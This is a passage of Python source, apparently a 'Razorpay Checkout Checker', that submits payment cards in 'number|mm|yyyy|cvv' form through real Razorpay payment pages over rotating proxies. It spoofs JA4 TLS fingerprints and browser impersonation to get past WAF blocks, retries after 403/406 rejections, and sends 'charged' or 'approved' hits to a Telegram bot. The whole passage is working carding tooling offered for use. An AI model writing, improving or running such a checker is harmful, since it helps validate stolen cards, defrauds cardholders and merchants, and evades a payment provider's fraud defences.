                    ja4_config=ja4_config, session_cache=cache,
                    per_request_timeout=per_request_timeout,
                    browser_profile=browser_profile,
                )
            elif use_primp:
                is_primp = True
                primp_cfg = _pick_primp_config(attempt)
                # Token bucket: skip if this target is rate-limited
                if not ja4_limiter.try_consume(primp_cfg['impersonate']):
                    if verbose:
                        print(f'  primp target {primp_cfg["impersonate"]} rate-limited, '
                              f'skipping attempt {attempt}', file=sys.stderr)
                    continue
                session = PrimpCheckoutSession(
                    payment_page_url=site_url,
                    card=card,
                    proxy=proxy_url,
                    amount_paise=amount_paise,
                    region=region,
                    verbose=verbose,
                    primp_config=primp_cfg,
                )
            else:
                # On first attempt with 'auto' backend, probe via backend_router
                # for WAF detection using weighted backends (wreq/curl_cffi/httpcloak).
                # If WAF is detected, the next attempt falls back to primp.
                if backend == 'auto' and attempt == 0:
                    try:
                        waf_result = await _br.route_checkout(site_url, proxy_url, amount_paise, max_attempts=2)
                        if waf_result.get('waf'):
                            _last_was_waf = True
                            if verbose:
                                print(f'  backend_router: WAF detected on {waf_result.get("backend")}, '
                                      f'will retry with primp', file=sys.stderr)
                            continue  # retry with primp on next attempt
                        await _br.record_outcome(waf_result.get('backend', 'curl_cffi'),
                                                 waf_result.get('status', 'ok'),
                                                 waf_result.get('waf', False))
                    except Exception:
                        pass  # backend_router error → fall through to curl_cffi

                # Generate fresh JA4 config — different impersonation target on retry
                ja4_config = engine.generate(browser='chrome', attempt=attempt)
                # Token bucket: skip if this JA4 target is rate-limited
                if not ja4_limiter.try_consume(ja4_config.impersonate_target):
                    if verbose:
                        print(f'  JA4 target {ja4_config.impersonate_target} rate-limited, '
                              f'skipping attempt {attempt}', file=sys.stderr)
                    continue

                session = RazorpaySession(
                    payment_page_url=site_url,
                    card=card,
                    proxy=proxy_url,
                    traffic_env=os.environ.get('RAZORPAY_TRAFFIC_ENV', 'canary'),
                    verbose=verbose,
                    amount_paise=amount_paise,
                    region=region,
                    ja4_config=ja4_config,
                    session_cache=cache,
                    per_request_timeout=per_request_timeout,
                    browser_profile=browser_profile,
                )
            # Configurable timeout per proxy attempt — gives slow proxies more budget
            # to complete the full 11-step checkout. Per-request timeout scales with proxy speed.
            try:
                made_http_attempt = True
                result = await asyncio.wait_for(session.run_async(), timeout=timeout)

                # PrimpCheckoutSession only does 3 WAF steps — if it passes,
                # retry with curl_cffi for the FULL checkout (not a bare 3-step result)
                if result.get('message') == 'primp_3step_pass':
                    if verbose:
                        print(f'  primp WAF bypass — retrying full checkout with curl_cffi',
                              file=sys.stderr)
                    _last_was_waf = False  # WAF cleared, don't re-trigger primp
                    continue  # retry with curl_cffi (next attempt)
            except asyncio.TimeoutError:
                # ANTI-LOSS: If the proxy died AFTER we submitted the card
                # (payment_id exists), rescue the charge!
                print(f'[CHECKOUT] TIMEOUT on proxy {proxy_tag} '
                      f'payment_id={session.tokens.get("payment_id", "none") if session else "no_session"} '
                      f'attempt={attempt}', file=sys.stderr)
                if session and session.tokens.get('payment_id'):
                    # Payment was created but proxy timed out before cancel/3DS.
                    # We CANNOT verify capture — this is NOT a confirmed hit.
                    # Mark as 'error' so the card gets retried with a faster proxy.
                    session.forced_outcome = {
                        'status': 'error',
                        'message': f'Proxy {proxy_tag} timed out after payment '
                                   f'({session.tokens["payment_id"]}) — cancel not attempted',
                        'reason': 'timeout_after_payment',
                    }
                    result = session._build_result(time.time() - t0)
                else:
                    # No payment_id — timed out before card was submitted
                    result = {
                        'card': 'unknown', 'status': 'error',
                        'message': 'Proxy timed out before payment creation',
                        'time_taken': f'{time.time()-t0:.1f}s',
                    }

            # If WAF 403, retry with different impersonation target + fresh session
            msg = str(result.get('message', '')).lower()
            if result.get('status') == 'error' and ('403' in msg or 'forbidden' in msg):
                if attempt < 1:
                    if verbose:
                        print(f'  WAF 403 (target={ja4_config.impersonate_target}) — '
                              f'retrying with fresh fingerprint...',
                              file=sys.stderr)
                    _last_was_waf = True
                    await asyncio.sleep(random.uniform(0.7, 1.3))
                    cache.remove(f"{site_url}|{proxy_tag}")
                    continue
                result['message'] += ' (retry exhausted)'
                tg_bot.increment_stat('waf_403')
                proxy_manager._record_proxy_failure(proxy_host)
                proxy_manager.set_cooldown(proxy_host, hours=10, reason="waf_403")
            # 406/401 = stale session token → invalidate cache + retry once
            if result.get('status') == 'error' and ('406' in msg or '401' in msg):
                if attempt < 1:
                    if verbose:
                        print(f'  Session rejected (406/401) — invalidating cache, retrying...',
                              file=sys.stderr)
                    _last_was_waf = True
                    cache.remove(f"{site_url}|{proxy_tag}")
                    await asyncio.sleep(1.0)
                    continue
                result['message'] += ' (retry exhausted)'
                proxy_manager.record_dead_proxy(proxy_url, reason="waf_406")
            return result

        except ValueError as e:
            return {
                'card': card_line or 'unknown', 'status': 'error', 'message': str(e),
                'site': site, 'amount_paise': amount_paise,
                'amount_inr': f'₹{amount_paise/100:.2f}',
                'time_taken': f'{time.time()-t0:.2f}s',
            }
        except Exception as e:
            err_str = str(e)

            # ANTI-LOSS: Catch proxy ConnectionReset / crash AFTER card submission.
            # If payment_id exists, the card was charged — rescue it as approved.
            print(f'[CHECKOUT] EXCEPTION on proxy {proxy_tag} '
                  f'payment_id={session.tokens.get("payment_id", "none") if session else "no_session"} '
                  f'error={err_str[:80]} attempt={attempt}', file=sys.stderr)
            if session and session.tokens.get('payment_id'):
                # Crash after payment created but cancel never attempted.
                # Outcome unknown — retry with different proxy, not a confirmed hit.
                session.forced_outcome = {
                    'status': 'error',
                    'message': f'Proxy {proxy_tag} crashed ({err_str[:40]}) after '
                               f'Payment Created ({session.tokens["payment_id"]}) — cancel not attempted',
                    'reason': 'crash_after_payment',
                }
                return session._build_result(time.time() - t0)

            # WAF retry via exception path
            if attempt < 1 and ('403' in err_str or '406' in err_str or '401' in err_str):
                cache.remove(f"{RazorpaySession._normalize_url(site)}|{proxy_tag}")
                await asyncio.sleep(random.uniform(1.5, 3.0))
                continue
            # 403 exhausted via exception path
            if '403' in err_str:
                tg_bot.increment_stat('waf_403')
                proxy_manager._record_proxy_failure(proxy_host)
                proxy_manager.set_cooldown(proxy_host, hours=10, reason="waf_403")
            return {
                'card': card_line or 'unknown', 'status': 'error',
                'message': f"Proxy Error: {err_str[:200]}",
                'site': site, 'amount_paise': amount_paise,
                'amount_inr': f'₹{amount_paise/100:.2f}',
                'time_taken': f'{time.time()-t0:.2f}s',
            }
        finally:
            # ALWAYS release resources — prevents FD exhaustion + memory leaks
            if ja4_config is not None and not is_primp:
                engine.release(ja4_config)
            if session is not None:
                try:
                    await session.aclose()
                except Exception:
                    pass

    if made_http_attempt:
        # Only penalize proxy if we actually made HTTP requests.
        # If ALL targets were rate-limited by the token bucket, the proxy
        # is healthy — the bottleneck is JA4 capacity, not the proxy.
        tg_bot.increment_stat('waf_403')
        proxy_manager._record_proxy_failure(proxy_host)
        proxy_manager.set_cooldown(proxy_host, hours=10, reason="waf_403")
        msg = 'WAF 403 — all impersonation targets blocked'
    else:
        msg = 'All JA4 targets rate-limited (token bucket exhausted) — retry later'
    return {'card': card_line or 'unknown', 'status': 'error',
            'message': msg,
            'site': site, 'amount_paise': amount_paise,
            'amount_inr': f'₹{amount_paise/100:.2f}',
            'time_taken': f'{time.time()-t0:.2f}s'}


# ── CLI ────────────────────────────────────────────────────────────────────
def notify_hit(result: dict, site: str = ''):
    """Global notification for approved/charged hits — works from any caller.
    api.py and server.py both use this for consistent Telegram alerts."""
    status = result.get('status', '')
    if status not in ('charged', 'approved'):
        return
    try:
        msg = result.get('message', '')
        reason = result.get('reason', '')
        # Include reason for debugging — helps distinguish real charges from false hits
        if reason and reason not in ('charged', 'declined', 'ccn'):
            msg = f"{msg}\n🔍 Reason: {reason}"
        # Include payment_id if present in message
        tg_bot.notify_charge(
            card_line=result.get('card', ''),
            gateway="Razorpay",
            message=msg,  # no truncation — send full diagnostic info
            amount_inr=result.get('amount_inr', '₹0.00'),
            site=site or result.get('site', ''),
        )
    except Exception as e:
        print(f"[notify] Failed to send Telegram alert: {e}", file=sys.stderr)


if __name__ == '__main__':
    import argparse
    ap = argparse.ArgumentParser(description='Razorpay Checkout Checker (Python)')
    ap.add_argument('--cc', required=True, help='Card: number|mm|yyyy|cvv')
    ap.add_argument('--site', required=True, help='Razorpay payment page URL')
    ap.add_argument('--proxy', required=True, help='Proxy: host:port:user:pass')
    ap.add_argument('--amount', type=int, default=DEFAULT_AMOUNT_PAISE,
                    help=f'Amount in paise (100 = ₹1.00). Default: {DEFAULT_AMOUNT_PAISE}')
    ap.add_argument('--verbose', action='store_true', help='Verbose logging')
    args = ap.parse_args()
    result = run_razorpay(args.cc, args.site, args.proxy, args.verbose, args.amount)
    print(json.dumps(result, indent=2, ensure_ascii=False))
